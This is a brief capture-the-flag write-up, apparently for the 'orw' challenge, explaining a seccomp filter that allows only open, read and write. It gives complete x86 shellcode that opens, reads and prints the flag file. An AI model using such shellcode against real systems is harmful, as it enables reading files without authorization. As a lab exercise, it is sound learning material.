reversing
=========

- takes 200 bytes of shellcode and executes it
- calls orw_seccomp function which ensures only open, read, and write syscalls can be used (no execv)


exploitation
============

super simple. here is the shellcode i wrote:

```asm
push 0
push 0x67616c66 // "ag"
push 0x2f2f2f77 // "w/fl"
push 0x726f2f65 // "e/or"
push 0x6d6f682f // "/hom"

mov eax, 5
mov ebx, esp
xor ecx, ecx // O_RDONLY
xor edx, edx // file already exists
int 0x80

mov ebx, eax
mov eax, 3
mov ecx, 0x0804a060 // where our shellcode is stored
sub ecx, 50         // prob enough space
mov edx, 50         
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, 0x0804a060
sub ecx, 50
mov edx, 50
int 0x80
```

